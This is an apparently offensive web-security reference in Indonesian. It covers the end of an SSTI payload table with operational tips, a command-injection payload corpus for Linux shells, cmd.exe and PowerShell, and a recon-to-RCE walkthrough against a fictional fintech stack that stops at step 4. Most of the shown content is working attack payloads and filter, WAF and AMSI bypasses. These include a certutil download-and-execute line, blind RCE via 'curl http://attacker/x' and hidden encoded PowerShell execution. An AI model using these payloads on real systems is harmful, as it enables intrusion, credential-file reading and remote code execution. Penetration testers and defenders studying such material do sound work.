| Freemarker | `<#include "/etc/passwd">` | hanya jika `TemplateLoader` mengizinkan |
| Velocity | via `FileReader`/`BufferedReader` (lihat 3.4) | verbose |
| Smarty | `{include file="/etc/passwd"}` | bergantung `template_dir` |
| Pebble | `{{ beans['x']... }}` | tidak ada file read murni; via `getClass` |
| ERB | `<%= File.read('/etc/passwd') %>` | langsung |
| ERB | `<%= IO.read('/etc/passwd') %>` | alternatif |
| Thymeleaf | `${T(org.apache.commons.io.FileUtils).readFileToString(T(java.io.File)('/etc/passwd'))}` | butuh commons-io |
| Thymeleaf | `__${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd',T(java.lang.String[]).class))}__::x` | JDK-only |

## 6. Membedakan SSTI dari XSS Sisi Server

| Aspek | SSTI | XSS (server-side render) |
|---|---|---|
| Payload uji | `{{7*7}}` → `49` | `{{7*7}}` → literal atau `<script>alert(1)</script>` |
| Refleksi | Output berubah di **body/response** setelah evaluasi | Output HTML terkirim apa adanya |
| Escape | Tidak di-escape engine (kecuali autoescape — lalu cek `{{7*7}}` masih `49` di dalam `&lt;`) | Di-escape (`&lt;script&gt;`) atau dijalankan di klien |
| Perbedaan kunci | `{{7*7}}` menghasilkan `49` bahkan di dalam `<pre>`, atribut HTML, JSON — karena evaluasi di server sebelum escape | `{{7*7}}` tetap literal; `<script>` di-escape atau dijalankan di browser |
| Konteks | Template dieksekusi server → bisa RCE, file read | Dieksekusi browser klien |
| Deteksi final | Kirim `{{7*'7'}}` → `7777777` (Jinja2) = bukti evaluasi server; atau `${7*7}` di header/cookie → `49` | Kirim `<img src=x onerror=alert(1)>` → dijalankan di browser, tidak di server |

Kesalahan umum di lapangan:
- Menyimpulkan SSTI karena `{{7*7}}` muncul di response — padahal input di-reflect mentah. Cek apakah `49` atau `{{7*7}}`.
- Mengira autoescape mematikan SSTI — autoescape HTML hanya me-escape output, evaluasi tetap jalan. `{{7*7}}` di template Jinja2 dengan `autoescape=True` tetap output `49` (bukan `{{7*7}}`).
- Menguji di parameter yang di-render engine JSON (bukan HTML) — escape `\u003c` bukan bukti XSS, tapi `49` tetap bukti SSTI.
- Mengabaikan bahwa XSS di template engine sering berujung SSTI jika input masuk ke **template source**, bukan **context**. Bedakan: `render_template_string(input)` = SSTI; `render_template('x.html', name=input)` = XSS (input jadi context, di-escape).

## 7. Jebakan Operasional (Field)

1. **Autoescape bukan penangkal SSTI.** `render_template_string(user)` dengan `autoescape=True` tetap evaluasi `{{7*7}}` → `49`. Banyak tester berhenti karena melihat `&lt;` di output.

2. **`{{7*7}}` di-reflect mentah ≠ tidak SSTI.** Bisa jadi engine bukan Jinja2/Twig/Pebble. Uji polyglot `${7*7}`, `<%=7*7%>`, `{7*7}`, `#{7*7}` sebelum menyimpulkan.

3. **Handlebars 4.x bukan target RCE.** `{{7*7}}` literal. Jangan kirim payload CVE-2019-19919 — gagal di 4.x. Cek `package.json`/`{{@root}}` untuk versi, atau hentikan.

4. **Thymeleaf butuh preprocessor `__${...}__::x`.** `${7*7}` di Spring hanya membuktikan Spring EL, bukan Thymeleaf. Jika `__${7*7}__::x` = `49`, baru Thymeleaf. Spring Boot ≥2.4 memblok `T(` dan `@` — cari sink `spring.view.prefix`/`spring.thymeleaf.prefix` (path traversal) daripada RCE.

5. **Freemarker `Execute` diblok sejak 2.3.30 di beberapa setup.** Cek `${.version}` dulu. Fallback `ObjectConstructor` + `ProcessBuilder`, atau `?api` (butuh `api_builtin_enabled=true`, jarang).

6. **Jinja2 `SandboxedEnvironment` memblok `__`.** Payload `__class__` gagal. Coba `|attr('__class__')` (kadang bypass di sandbox lama), atau cari sink lain (upload, SSRF). Jinja2 3.1.x sandbox tidak ada RCE langsung — jangan paksakan.

7. **Twig 3.x + `SandboxExtension` + `restrict`.** `system` diblok. `{{source()}}` untuk file read jika tidak diblok. `{{['id']|filter('system')}}` gagal di sandbox ketat. Cek error: `Calling "system" on a template is not allowed`.

8. **ERB di Rails sering di-`sanitize`.** `<%= %>` dihapus → coba `<% %>` (tag non-output, tetap eksekusi). Jika keduanya dihapus, bukan ERB — cek apakah input masuk ke `render inline:` (Rails `render inline: params[:x]` = SSTI ERB, serius).

9. **Output RCE Java `Runtime.exec` tidak mengembalikan string.** `exec('id')` return `Process` → response kosong. Blind: pakai `curl http://attacker/x` atau `ProcessBuilder` + `StreamUtils`. Kesalahan klasik: menyimpulkan "gagal" karena output kosong.

10. **WAF memblok `{{`, `${`, `__`, `Runtime`, `system`.** Bypass: `{{` dengan `{%print%}`, `__` dengan `|attr`, `Runtime` dengan concat string (`"Run"+"time"`), `${` dengan `<#assign>` di Freemarker. Uji di header (`X-Forwarded-For`, `User-Agent`) yang sering tidak di-WAF tapi dirender ke log/email template.

11. **Input di-`urlencode` sebelum render.** `{{7*7}}` jadi `%7B%7B7%2A7%7D%7D` — tidak dieksekusi. Cek response: jika `{{7*7}}` muncul (bukan `49`), decode tidak terjadi. Uji di body `application/json` (bukan form) yang lebih jarang di-encode.

12. **SSTI di email template / PDF generator.** Sering async — response HTTP kosong. Blind: kirim `{{7*'7'}}` lalu cek inbox/S3 untuk `7777777`, atau RCE blind ke collaborator.

13. **Versi engine ≠ versi framework.** Symfony 5 + Twig 2.14 vs Twig 3.3 beda payload. Cek `${.version}`/`{{_self.env}}`/`$smarty.version`/`RUBY_VERSION` dulu, jangan tebak.

14. **Polyglot bisa false positive.** `{{7*7}}` = `49` di halaman yang memang berisi `49` (harga, ID). Bandingkan baseline: request dengan `{{7*8}}` → harus `56`, bukan `49` statis. Selalu uji dua nilai berbeda.

15. **Thymeleaf di Spring Boot 3.x (Spring 6).** `T()` diblok total (`Instantiation of new objects and access to static classes is forbidden`). Fokus ke `${@environment}` (jika bean resolver aktif) atau path traversal, bukan RCE.

16. **Velocity `$x.class` butuh `$x` non-null di context.** Di context kosong, `#set($x='')` bikin `$x` string kosong — `''.class` di Velocity 2.x = `String.class` (ok), di 1.x gagal. Cek `${velocity.version}`.

17. **Smarty `{php}` dihapus di Smarty 3.** `{system()}` butuh `SmartyBC` (`$smarty->bcEnabled`). Cek `{$smarty.version}` — jika 3.x tanpa BC, pakai `Smarty_Internal_Write_File::writeFile` (butuh `writeFile` tidak diblok) atau `{include file=...}` untuk file read.

18. **Jangan kirim payload destruktif saat uji.** `{{lipsum.__globals__.os.popen('rm -rf /').read()}}` di prod = insiden. Gunakan `id`, `whoami`, `curl` ke collaborator, atau `sleep 5` untuk konfirmasi blind sebelum RCE nyata.


## w2-cmdi-corpus

# w2-cmdi-corpus — web

# Korpus Command Injection — Referensi Payload per OS & Bypass Filter

## 1. Linux / POSIX Shell

### 1.1 Operator dasar & chaining

| # | Payload literal | Dikirim sebagai | Muncul di shell | Target filter yang dilewati |
|---|---|---|---|---|
| 1 | `;id` | `cmd; id` | eksekusi `id` setelah command pertama | filter yang hanya blok `&&`/`\|\|` |
| 2 | `\|id` | pipe | stdout pipe ke `id` | blok `;` tapi tidak pipe |
| 3 | `\|\|id` | OR-list | `id` jalan bila kiri gagal | filter yang blok `&&` saja |
| 4 | `&&id` | AND-list | `id` jalan bila kiri sukses | filter yang blok `;` dan `\|` |
| 5 | `&id` | background + list | `id` di background | filter regex `^[a-zA-Z0-9 ]+$` naif |
| 6 | `` `id` `` | backtick substitution | output `id` inline | filter yang blok `$(` tapi lupa backtick |
| 7 | `$(id)` | command substitution | output inline | filter yang blok backtick saja |
| 8 | `$((16#41))` | arith expansion | `A` (65) | filter yang blok `$(` literal tapi tidak arith |
| 9 | `${IFS}` | var expansion | spasi/tab | filter yang blok spasi literal |
| 10 | `{cat,/etc/passwd}` | brace expansion | `cat /etc/passwd` | filter yang blok spasi / `cat ` literal |
| 11 | `a=/etc/passwd;cat${IFS}$a` | assignment + IFS | baca file | filter yang blok path literal `/etc/passwd` |
| 12 | `cat$IFS/etc/passwd` | IFS tanpa brace | baca file | blok spasi, tidak blok `$IFS` |
| 13 | `cat</etc/passwd` | redirect stdin | baca file | filter yang butuh argumen setelah `cat` |
| 14 | `cat$IFS$9/etc/passwd` | `$9` = positional kosong | separator | blok `$IFS` tanpa `$9`/`$@` |
| 15 | `echo${IFS}id\|sh` | IFS + pipe | eksekusi `id` | blok `\|` + spasi, tidak IFS |
| 16 | `id%0a` | newline URL-encoded | `id\n` | filter line-based (grep per baris) |
| 17 | `id%0d%0a` | CRLF | `id\r\n` | filter yang hanya strip `%0a` |
| 18 | `%09id` | TAB | `\tid` | filter spasi literal, tidak TAB |
| 19 | `$(printf${IFS}"\\x69\\x64")` | hex via printf | `id` | filter blacklist string `id`, `cat`, `whoami` |
| 20 | `$(echo${IFS}aWQ=\|base64${IFS}-d)` | base64 | `id` | blacklist command name literal |
| 21 | `$(echo${IFS}6964\|xxd${IFS}-r${IFS}-p)` | hex→bytes | `id` | blacklist `base64`, `printf` |
| 22 | `/bin/c?t${IFS}/etc/passwd` | glob `?` | `/bin/cat` | blacklist `/bin/cat` literal, allowlist path prefix |
| 23 | `/bin/c[a]t${IFS}/etc/passwd` | glob `[]` | `/bin/cat` | blacklist `cat` substring |
| 24 | `/???/c?t${IFS}/etc/p?sswd` | glob ganda | resolve path | blacklist seluruh path literal |
| 25 | `w\ho\a\m\i` | backslash escape | `whoami` | filter kata `whoami` tanpa normalisasi escape |
| 26 | `wh''oami` | empty-quote concat | `whoami` | blacklist `whoami` literal |
| 27 | `who"$@"ami` | `$@` kosong | `whoami` | blacklist literal + `$IFS`-only |
| 28 | `$'\\x69\\x64'` | ANSI-C quoting | `id` | filter yang hanya lihat `$(` dan backtick |
| 29 | `eval${IFS}$(echo${IFS}aWQ=\|base64${IFS}-d)` | eval + b64 | `id` | blacklist langsung command, tidak `eval` |
| 30 | `sh${IFS}-c${IFS}'id'` | nested shell | `id` | filter yang blok `;`/`\|` tapi izinkan `sh -c` |
| 31 | `x=$'\\x2f\\x62\\x69\\x6e\\x2f\\x69\\x64';$x` | hex var | jalankan `/bin/id` | blacklist path literal |
| 32 | `id${IFS}#` | comment terminator | `id` lalu komentar sisa | filter yang menambahkan suffix `\|\|true` literal |
| 33 | `tac${IFS}/etc/passwd` | alt binary | `tac` | blacklist `cat` only |
| 34 | `/bin/busybox${IFS}cat${IFS}/etc/passwd` | busybox applet | baca file | blacklist `/bin/cat` path |

Catatan eksekusi:
- `$((16#41))` hanya jalan di `bash`/`ksh`, **gagal di `dash`** (default `/bin/sh` di Debian/Ubuntu 24.04) — muncul `arithmetic syntax error`.
- `${IFS}` default = `space + TAB + newline` di bash 5.x; di `sh` POSIX tetap space/TAB.
- `%0a` setelah command di URL: hanya efektif bila backend memecah argumen per baris (mis. `system("grep ".$_GET['q'])` dipanggil lewat `sh -c`), **bukan** bila argumen di-quote `escapeshellarg`.
- `$'...'` ANSI-C quoting **tidak portabel ke `dash`** — gagal dengan `Syntax error: "(" unexpected`.

## 2. Windows `cmd.exe`

Asumsi: Windows 11 24H2, `cmd.exe` build 10.0.26100, `CommandLineToArgvW` parsing.

| # | Payload literal | Dikirim | Muncul | Filter dilewati |
|---|---|---|---|---|
| 1 | `& whoami` | `cmd & whoami` | eksekusi berurutan | filter blok `&&` |
| 2 | `\| whoami` | pipe | pipe | filter blok `&` |
| 3 | `&& whoami` | AND | kondisional | filter blok `&` + `\|` |
| 4 | `\|\| whoami` | OR | kondisional | filter blok `&&` |
| 5 | `^& whoami` | caret escape `&` | literal `&` di argv, lalu reparse | filter regex `[&]` (caret lolos) |
| 6 | `^\| whoami` | caret escape pipe | `\|` → pipe | filter `[\|]` |
| 7 | `^< file` | redirect via caret | `<` literal | filter `<`/`>` |
| 8 | `whoami^` | trailing caret | caret hilang, `whoami` jalan | filter kata terlarang dengan trailing `^` |
| 9 | `%PATH:~0,1%whoami` | var substring | `C:\...` — bukan eksekusi, **dekorasi** | filter kata `whoami` literal (pecah token) |
| 10 | `%COMSPEC% /c whoami` | env var | `cmd.exe /c whoami` | filter kata `cmd`/`cmd.exe` |
| 11 | `%SystemRoot%\System32\whoami.exe` | env var | path absolut | filter path literal |
| 12 | `who^ami` | caret di tengah | `whoami` | filter substring `whoami` |
| 13 | `wh"oami"` | quote concat | `whoami` | filter substring tanpa normalisasi quote |
| 14 | `c:\windows\system32\who^ami.exe` | caret di binary | `whoami.exe` | filter `whoami` substring |
| 15 | `for %i in (whoami) do %i` | FOR loop | `whoami` | filter kata `whoami` (token terpisah) |
| 16 | `for /f %i in ('whoami') do @echo %i` | FOR /f | output | filter `whoami` literal |
| 17 | `set x=whoami&call %x%` | var + call | `whoami` | filter kata command langsung |
| 18 | `set x=who&set y=ami&call %x%%y%` | split var | `whoami` | filter substring |
| 19 | `echo whoami\|cmd` | pipe ke cmd | eksekusi | filter `whoami` di argumen, bukan command slot |
| 20 | `certutil -urlcache -f http://x/a a.bat&a.bat` | LOLBin | download+exec | filter `powershell`/`curl` |
| 21 | `whoami>%TEMP%\o.txt&type %TEMP%\o.txt` | redirect | exfil ke file | filter yang blok pipe ke output |
| 22 | `whoami ^&^& whoami` | caret ganda | `&&` efektif | filter `&&` literal |
| 23 | `cmd /c ^"whoami^"` | quote caret | nested cmd | filter `cmd /c` literal |
| 24 | `%0a` (via `\n` di `cmd /c`) | newline | `cmd` split command | filter yang enkode per-line |
| 25 | `powershell -c "whoami"` | LOLBin substring | eksekusi | filter kata `powershell` (bila case-sensitive) |
| 26 | `po^wershell -c whoami` | caret | `powershell` | filter substring `powershell` |

Catatan:
- `^` hanya "meng-escape" karakter metakarakter **saat parsing `cmd.exe`**; jika argumen diteruskan ke `CreateProcess` sebagai `lpCommandLine` tanpa `cmd /c`, caret **tidak** diinterpretasi dan parsing dilakukan `CommandLineToArgvW` → payload `^&` muncul literal.
- `%PATH:~0,1%` **tidak** mengeksekusi apa pun; ini hanya untuk memecah token blacklist. Klaim "bypass filter via %PATH%" yang umum beredar salah kaprah — yang benar adalah `%COMSPEC%` / `%SystemRoot%` untuk path resolution.
- Windows 11 24H2 memperketat `cmd.exe` untuk `Autorun` registry, tidak memengaruhi parsing injection.

## 3. PowerShell (Windows PowerShell 5.1 & PowerShell 7.4)

| # | Payload literal | Dikirim | Muncul | Filter dilewati |
|---|---|---|---|---|
| 1 | `; whoami` | statement sep | `whoami` | filter `&&` (PS 5.1 tak dukung `&&`) |
| 2 | `$(whoami)` | subexpression | output | filter backtick |
| 3 | `` `whoami `` | backtick escape spasi | ` whoami` | filter leading space |
| 4 | `&('whoami')` | call operator | `whoami` | filter kata `whoami` (di-quote) |
| 5 | `&("wh"+"oami")` | concat + call | `whoami` | filter substring |
| 6 | `iex("who"+"ami")` | Invoke-Expression | `whoami` | filter `iex` literal (pakai `&{...}`) |
| 7 | `&{whoami}` | scriptblock | `whoami` | filter `iex`/`invoke-expression` |
| 8 | `[char]119+[char]104+...\|iex` | char code | `whoami` | filter seluruh string command |
| 9 | `([char[]](119,104,111,97,109,105)-join'')` | char array | `whoami` | filter substring |
| 10 | `-join('wh','oami')\|iex` | join + iex | `whoami` | filter literal |
| 11 | `p^owershell` (dari cmd) | caret (bukan PS) | `powershell` | lihat §2 |
| 12 | `powershell -e <b64>` | `-EncodedCommand` | decode → exec | filter string command di argv (lihat §4) |
| 13 | `$env:ComSpec /c whoami` | env | `cmd /c whoami` | filter kata `cmd` |
| 14 | `whoami #` | comment | `whoami` | filter yang append suffix |
| 15 | `who`+`ami` di variabel | `$a='who';$b='ami';&("$a$b")` | `whoami` | filter substring |
| 16 | `& (Get-Command whoami)` | cmdlet | eksekusi | filter kata langsung |
| 17 | `` who`ami `` | backtick sisip | `whoami` | filter substring tanpa strip backtick |
| 18 | `w`ho`a`m`i` | backtick antar char | `whoami` | filter substring |
| 19 | `. (gcm *hoami)` | dot-source wildcard | `whoami` | filter kata `whoami`/`gcm` |
| 20 | `[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hvYW1p'))\|iex` | b64 in PS | `whoami` | filter string `whoami`, `base64` |

Catatan:
- PowerShell 5.1 di Windows 11 24H2 masih default `wScript`; PowerShell 7.4 (pwsh) memakai parser sama untuk operator `&`, `$(...)`.
- `-EncodedCommand` mengharuskan **UTF-16LE base64**, bukan UTF-8 — payload base64 UTF-8 akan gagal decode (`FormatException`).
- `iex` di PS 7.4 dengan `$PSNativeCommandArgumentPassing` tidak berubah — tetap berjalan.

## 4. Bypass filter tingkat transport

| Teknik | Contoh literal | Dikirim | Efektif bila | Gagal bila |
|---|---|---|---|---|
| URL-encode | `%3Bid` | `;id` | backend decode sebelum concat | WAF decode dulu (double decode) |
| Double URL-encode | `%253Bid` | `%3B` → `;` | backend decode 2× (mis. nginx `proxy_pass` + app) | hanya decode 1× |
| Unicode fullwidth | `；id` (U+FF1B) | — | **tidak** dieksekusi shell | selalu gagal untuk `sh`/`cmd` |
| Newline | `%0a`, `%0d%0a` | `\n` | argumen split `sh -c` per line | `escapeshellarg`/`escapeshellcmd` |
| Null byte | `%00;id` | `\0;id` | C-string truncation (PHP < 5.3.4, lama) | semua PHP ≥ 5.3.4, nginx 1.25 |
| Overlong UTF-8 | `%c0%bb` | `;` | decoder lama (IIS 5/6) | semua stack modern |
| HPP (HTTP Param Pollution) | `?q=a&q=;id` | concat `a;id` | backend concat semua nilai | framework ambil first/last saja |
| Chunked body | transfer-encoding chunked | payload dipecah | WAF rekonstruksi body | WAF block TE |

## 5. Base64-wrap per platform

Linux (bash):
```
bash -c "$(echo aWQ= | base64 -d)"
```
Muncul: `id`. Bypass filter yang blacklist `id`, `cat`, `whoami`, `wget`, `curl`. **Gagal** di `dash` bila target `/bin/sh` → `base64` mungkin tak ada; fallback `openssl base64 -d`.

Windows cmd:
```
powershell -nop -w hidden -e aQBkAA==
```
`aQBkAA==` = UTF-16LE `id\r\n`? — bukan, `aQBk` = `i d` UTF-16LE = `id`. Eksekusi `id` di PowerShell → **CommandNotFoundException** (tidak ada `id.exe` default). Ganti `d2hvb2FtaQ==` = UTF-8 `whoami`, tapi `-e` butuh UTF-16LE: `dwBoAG8AYQBtAGkA`.

PowerShell (in-process):
```
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))|iex
```

## 6. Wildcard glob — target filter yang dilewati

| Payload | Resolve | Filter dilewati |
|---|---|---|
| `ca?t /etc/passwd` | `/usr/bin/cat` | blacklist string `cat` |
| `/bin/wh?ch id` | `/usr/bin/which` | blacklist `which` |
| `/???/c?t /etc/p?sswd` | `/bin/cat` | blacklist path & filename |
| `c[a]t` | `cat` | blacklist substring `cat` (butuh shell glob aktif) |
| `/bin/l[s] -la` | `ls` | blacklist `ls` |
| `*/*n/c?t` | glob ambiguity, **gagal** jika multiple match → `ambiguous redirect` | — |

Catatan: glob **tidak jalan** jika argumen di-quote (`"ca?t"`) atau jika `sh` dipanggil dengan `set -f` (noglob). PHP `escapeshellarg` → `'ca?t'` → glob mati.

## 7. Tanpa-spasi (`$IFS` / TAB / `${IFS}`)

| Payload | Platform | Hasil |
|---|---|---|
| `cat${IFS}/etc/passwd` | bash/sh | ok |
| `cat$IFS/etc/passwd` | bash/sh | ok (IFS = space tab newline) |
| `cat$IFS$9/etc/passwd` | bash/sh | ok, `$9` = empty positional |
| `cat${IFS:0:1}/etc/passwd` | bash (substring IFS) | `cat /etc/passwd`, `${IFS:0:1}` = space |
| `id%09` | URL | TAB, banyak filter regex `\s` sudah cover |
| `cat</etc/passwd` | sh | redirect, tanpa spasi |
| `{cat,/etc/passwd}` | bash (bukan sh) | brace expansion, **gagal di `dash`** |

## 8. Jebakan operasional (yang bikin gagal di lapangan)

1. **`/bin/sh` bukan bash di Debian/Ubuntu 22.04+/24.04.** `dash` tidak mendukung `$'...'`, `$((16#41))`, brace expansion, `{cat,...}`. Payload bash-only muncul sebagai `Syntax error: "(" unexpected` atau `Bad substitution`. Uji dulu: `echo $0` → `/bin/sh` vs `/bin/bash`.

2. **`escapeshellarg`/`escapeshellcmd`/`proc_open` array** mematikan hampir semua payload di atas. Injection hanya hidup bila: `system("ls ".$_GET['d'])`, `exec("ping -c1 $ip")`, `popen("grep $q file","r")`, `Runtime.exec(String)` di Java, `os.system("cmd "+x)` Python, PHP `shell_exec` dengan concat.

3. **WAF decode-order mismatch.** WAF (Cloudflare, AWS WAF, ModSecurity CRS 3.3+) decode URL **sebelum** regex. `%253B` jadi `%3B` di log WAF tapi `;` di app → bypass hanya jika app decode dua kali. Uji dengan payload canary `%253Bid%2520` dan lihat log 403 vs 200.

4. **Windows `CommandLineToArgvW` vs `cmd /c`.** Caret `^` hanya metakarakter di `cmd.exe`. Jika service (mis. IIS/ASP.NET `Process.Start` tanpa `ShellExecute` atau Java `Runtime.exec`) memanggil binary langsung, `^&` **tidak** jadi `&` — payload `.NET` harus pakai `&` literal atau `"` biasa. Kebalikannya, `cmd /c` menambah satu lapis parsing → payload butuh escape ganda.

5. **PowerShell `-EncodedCommand` strict UTF-16LE.** Base64 UTF-8 (`d2hvb2FtaQ==`) gagal `FormatException` di PS 5.1 dan 7.4. Encoder harus `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))`. Ini penyebab #1 payload PS "tidak jalan padahal tampak benar".

6. **`$IFS` tidak jalan di argumen yang di-quote oleh framework.** Django `subprocess.run(cmd, shell=True)` OK; `subprocess.run(["ls", user_input])` — injection mati total. Flask `os.system(f"grep {q} f")` OK.

7. **Glob di path absolut dengan `*` sering ambiguous.** `*/*n/c?t` bisa match `/bin/cat` atau `/sbin/cat` atau keduanya → `cat: ambiguous redirect` atau eksekusi binary salah. Gunakan `?` per-karakter, bukan `*`, untuk determinisme.

8. **`%0a` tidak selalu split argumen.** Di `cmd.exe` newline tidak memecah command; di PowerShell newline memecah **statement** (jalan), di `sh -c` memecah perintah (jalan), di Java `Runtime.exec(String)` newline **tidak** split (single argv) → gagal.

9. **Filter berbasis allowlist regex** (`^[a-z0-9\s]+$`, `^[\w\-]+$`) mematikan **semua** payload §1–§3 kecuali yang murni alfanumerik — dan hampir tidak ada. Realistis: injection hanya hidup di endpoint yang memang butuh metakarakter (filename, URL, path). Fokus oracle ke parameter tersebut.

10. **`%COMSPEC%` / `%PATH:~0,1%` bukan eksekusi.** Banyak writeup keliru menyebut "bypass via `%PATH%`". Yang benar: `%COMSPEC%` = path ke `cmd.exe`, `%SystemRoot%` = `C:\Windows`. `%PATH:~0,1%` hanya substring pertama `PATH` (`C`) — tidak mengeksekusi apa pun, hanya memecah token blacklist jika digabung, mis. `who%PATH:~7,1%ami` = `whoami` bila char ke-7 PATH = `a`. Verifikasi per-host, jangan asumsi.

11. **Windows Defender & AMSI** memblok `powershell -e`, `iex`, `Invoke-Expression`, `certutil -urlcache` di Windows 11 24H2 dengan signature 2024+. `-nop -w hidden -e` masih sering ke-block di endpoint dengan ASR rule "Block process creations originating from PSExec and WMI commands". Uji dengan `-EncodedCommand` yang dipecah chunk atau `Add-Type` runtime compile.

12. **nginx 1.25 `proxy_pass` + `$uri` normalisasi** decode `%2e%2e`, tapi **tidak** decode `;` di path segment — `;id` di path (`/x;id`) tidak jadi injection kecuali app mem-parsing path segment dengan `;` sebagai delimiter (Tomcat, Java `getPathInfo`). Di Tomcat 10.1, `;` di path di-strip oleh `UrlPathNormalizer` sebelum `getServletPath` — injection gagal.

13. **Base64-wrap di target tanpa `base64`/`openssl`.** Alpine/busybox minimal image sering tidak punya `base64` (ada `busybox base64`), tidak punya `xxd`, tidak punya `printf \x` (busybox `printf` tidak support `\x` tanpa `-e` di beberapa build). Siapkan fallback `od -An -tx1` + `awk`, atau murni shell arith `$((16#id))`.

14. **Shellshock-class var name injection** (`() { :;};`) hanya relevan di bash ≤ 4.3 — semua distro modern sudah patch. Jangan dimasukkan ke korpus live, hanya untuk lab legacy.

15. **`$@`/`$*` separator vs `$9`.** `$@` kosong bila tidak ada positional; `$9` kosong bila <9 arg. Keduanya bekerja sebagai "empty word" untuk memisah token, **tapi** dalam `sh -c 'id$@'` `$@` bisa kosong total → `id` jalan tanpa separator, tetap OK. Di `sh -c 'cat$@/etc/passwd'` → `cat/etc/passwd` (path salah) → **gagal**. Gunakan `${IFS}` untuk separator deterministik.


## w2-full-chain-walkthrough

# w2-full-chain-walkthrough — web

# Walkthrough Referensi: Recon → RCE pada Stack Fintech (nginx 1.25 + Laravel 10 + MySQL 8.0 + MinIO di AWS)

Target latihan: `fintech-example.internal` (skema identik dengan engagement riil; nilai sensitif di-redact sebagai `[REDACTED]`).

Stack konkret:
| Komponen | Versi | Peran |
|---|---|---|
| nginx | 1.25.3 (Ubuntu 22.04) | reverse proxy + static |
| PHP-FPM | 8.2.13 | runtime Laravel |
| Laravel | 10.38 | framework app |
| MySQL | 8.0.35 | RDS di VPC privat |
| MinIO | RELEASE.2024-01-16 | object storage staging |
| AWS | EC2 t3.medium + ALB + IAM role instance | hosting |
| OS | Ubuntu 22.04.3 LTS | host |

---

## Step 1 — Domain Enumeration

**Tujuan:** Petakan aset publik, temukan namespace yang bisa dipakai untuk pivot.

**Tool:** `subfinder v2.6.3`, `dnsx v1.2.1`, `amass v4.2.0` (passive), `whois`.

```bash
subfinder -d fintech-example.com -all -silent -o subs.txt
dnsx -l subs.txt -a -resp -silent -o subs_resolved.txt
amass enum -passive -d fintech-example.com -o amass_passive.txt
```

Perintah WHOIS/registrar:
```bash
whois fintech-example.com | grep -Ei 'registrar|creation|name server'
dig +short NS fintech-example.com
dig +short TXT fintech-example.com
```

**Output yang diharapkan:**
```
api.fintech-example.com        203.0.113.21
app.fintech-example.com        203.0.113.22
www.fintech-example.com        203.0.113.20 (CNAME alb-prod-....elb.amazonaws.com)
staging.fintech-example.com    203.0.113.44
cdn.fintech-example.com        104.18.x.x (Cloudflare)
```
TXT record bocor: `"v=spf1 include:_spf.google.com include:mailgun.org ~all"` + `"google-site-verification=..."` (petunjuk GSuite → email OSINT).

**Artefak log (DNS/ALB sisi target):**
- ALB access log: `type https ... "GET / HTTP/1.1" 200 ...` dari IP scanner muncul berurutan dalam <60 detik → *enumeration burst*.
- GuardDuty finding `Recon:EC2/PortProbeUnprotectedPort` jika scan port ikut dijalankan.

**Kenapa berhasil:** namespace `staging.` tidak di-cover oleh WAF rule dan tidak diotorisasi sebagai hostname di ALB listener.

**Gagal jika:** domain pakai wildcard `*.fintech-example.com` di Cloudflare + DNSSEC + CAA strict → subfinder hanya menghasilkan noise.

---

## Step 2 — Subdomain Baru via Certificate Transparency & Permutasi

**Tool:** `crt.sh` query + `gau`/`waybackurls` + `dnsgen v1.0.4` + `massdns`.

```bash
curl -s "https://crt.sh/?q=%25.fintech-example.com&output=json" \
  | jq -r '.[].name_value' | sort -u > ct_subs.txt

cat subs.txt ct_subs.txt | sort -u > all_subs.txt
dnsgen all_subs.txt | massdns -r resolvers.txt -t A -o S -w dnsgen_out.txt
grep -E 'staging|dev|uat|qa|internal|admin|minio|s3' dnsgen_out.txt
```

**Output yang diharapkan:**
```
minio-staging.fintech-example.com   203.0.113.45
admin-staging.fintech-example.com   203.0.113.44
api-uat.fintech-example.com         203.0.113.60
```
`crt.sh` juga membocorkan: `CN=staging.fintech-example.com, O=Fintech Corp, OU=Engineering` — issuer Let's Encrypt, valid 90 hari.

**Artefak log:**
- nginx `access.log` di host `minio-staging`: banyak `GET /` 403 dari satu IP → *bucket enumeration*.
- Cloudflare audit log (jika ada) tidak menangkap subdomain non-proxied.

**Kenapa berhasil:** tim ops menerbitkan cert LE untuk staging dengan DNS record A langsung ke EC2 (bukan ALB) → tidak ada WAF, tidak ada auth guard di edge.

**Gagal jika:** pakai wildcard `*.internal` + hanya DNS internal (split-horizon) → CT tidak bocor.

---

## Step 3 — JavaScript Mining

**Tujuan:** Recover endpoint tersembunyi, API key, dan base URL staging dari bundle app.

**Tool:** `httpx v1.3.7`, `katana v1.0.4`, custom regex.

```bash
cat all_subs.txt | httpx -silent -sc -title -td -o live.txt

katana -u https://app.fintech-example.com -jc -d 3 -kf all -o katana_urls.txt
```

Ekstrak JS lalu grep:
```bash
grep -Eo 'https?://[^"'\''<> ]+\.js' katana_urls.txt | sort -u > js_urls.txt
while read u; do
  curl -s "$u" | grep -EoE 'https?://[a-zA-Z0-9./_-]+|/[a-zA-Z0-9/_-]+\.(php|json|env)' >> js_endpoints_raw.txt
done < js_urls.txt
sort -u js_endpoints_raw.txt | grep -E 'staging|debug|api|minio|\.env'
```

Grep khusus (truggle):
```bash
grep -Eo '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})' $(cat js_urls.txt) 2>/dev/null
grep -Eo 's3\.[a-z0-9-]+\.amazonaws\.com/[a-zA-Z0-9._-]+' js_endpoints_raw.txt | sort -u
```

**Output yang diharapkan (potongan `app.fintech-example.com/_next/static/chunks/main-*.js`):**
```js
const API_BASE = "https://api-staging.fintech-example.com/v1";
const DEBUG_ROUTE = "/_debug/env";
const S3_ENDPOINT = "http://minio-staging.fintech-example.com:9000";
```
Serta token JWT statis di bundle (rotasi jarang): `eyJhbGciOi...` — scope `read:transactions`.

**Artefak log:**
- CDN access log: `GET /_next/static/chunks/main-8a1f2c.js 200` dari IP attacker saat mining.
- WAF rule "JS bundle scan" tidak memicu karena UA default curl tidak diblok; kalau pakai Chrome 131 headless, UA `HeadlessChrome` memicu `AWSManagedRulesBotControlRuleSet`.

**Kenapa berhasil:** deploy Next.js menyertakan string env di bundle untuk staging (misconfig `NEXT_PUBLIC_*` berisi endpoint internal).

**Gagal jika:** bundle di-minify dengan string obfuscation (jscrambler) → regex gagal, butuh dynamic instrumentation.

---

## Step 4 — Endpoint Staging & Fingerprint

**Tool:** `nuclei v3.1.0`, `ffuf v2.1.0`, `whatweb v0.5.5`.

```bash
